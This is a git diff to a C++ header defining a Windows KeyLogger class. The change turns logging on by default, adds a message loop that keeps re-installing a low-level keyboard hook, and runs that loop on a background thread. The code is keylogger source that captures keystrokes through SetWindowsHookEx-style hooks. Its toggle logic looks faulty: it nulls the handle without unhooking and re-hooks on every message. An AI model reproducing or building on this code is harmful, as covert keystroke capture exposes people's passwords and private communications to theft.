@@ -1,6 +1,7 @@
 #pragma once
 #include <windows.h>
 #include <iostream>
+#include <thread>
 
 using namespace std;
 
@@ -9,7 +10,7 @@ class KeyLogger
 	HHOOK HK;
 	KBDLLHOOKSTRUCT kbdStruct;
 
-    bool is_enabled = false;
+    bool is_enabled = true;
 
     //void (*HookCallbackKeyboard)(int nCode, WPARAM wParam, LPARAM lParam);
 
@@ -19,6 +20,23 @@ class KeyLogger
         {
             MessageBox(NULL, L"Failed to install hook on keyboard!", L"Error", MB_ICONERROR);
         }
+    }
+
+    void LogLoop() {
+        SetHook();
+        MSG msg;
+        while (GetMessage(&msg, NULL, 0, 0))
+        {
+            if (!is_enabled)
+            {
+                HK = NULL;
+            }
+            else {
+                SetHook();
+            }
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        };
     }
 
 public:
@@ -32,12 +50,11 @@ public:
     }
 
     void ToggleOn() {
-        if (is_enabled) {
-            HK = NULL;
-        }
-        else {
-            SetHook();
-        }
+            is_enabled = !is_enabled;
+    }
+
+    thread spawn() {
+        return thread(&KeyLogger::LogLoop, this);
     }
 
 };
